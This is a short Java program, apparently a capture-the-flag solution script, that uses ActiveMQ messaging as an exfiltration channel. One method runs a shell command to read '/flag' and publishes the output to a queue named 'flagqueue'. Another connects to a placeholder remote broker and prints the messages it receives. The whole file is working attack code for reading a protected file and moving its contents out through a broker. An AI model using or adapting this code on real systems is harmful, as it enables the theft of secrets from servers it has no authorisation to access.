package api;

import org.apache.activemq.ActiveMQConnectionFactory;
import javax.jms.*;
import java.util.Scanner;

public class Main implements MessageListener {
    private void publish() throws Exception {
        javax.jms.ConnectionFactory factory;
        factory = new ActiveMQConnectionFactory("tcp://127.0.0.1:61616");
        Connection connection = factory.createConnection();
        Session pubSession = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);
        Queue queue = pubSession.createQueue("flagqueue");
        MessageProducer publisher = pubSession.createProducer(queue);
        String[] cmd;
        cmd = new String[]{"/bin/sh","-c","cat /flag"};
        byte[] bs = new Scanner(new ProcessBuilder(cmd).start().getInputStream())
                .useDelimiter("\\A")
                .next()
                .getBytes();
        String message = new String(bs);
        TextMessage msg = pubSession.createTextMessage();
        msg.setText(message);
        publisher.send(msg);
        System.out.println("publish finished");
        connection.close();
    }

    private void consume() throws Exception {
        ConnectionFactory factory = new ActiveMQConnectionFactory("tcp://xxx:61616");
        Connection connection = factory.createConnection();
        Session subSession = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);
        Queue queue = subSession.createQueue("flagqueue");
        MessageConsumer subscriber = subSession.createConsumer(queue);
        subscriber.setMessageListener(this);
        connection.start();
    }


    public static void main(String[] args) throws Exception {
        Main main = new Main();
        //  main.publish();
        main.consume();
    }

    @Override
    public void onMessage(Message message) {
        try {
            System.out.println("Received " + ((TextMessage) message).getText());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
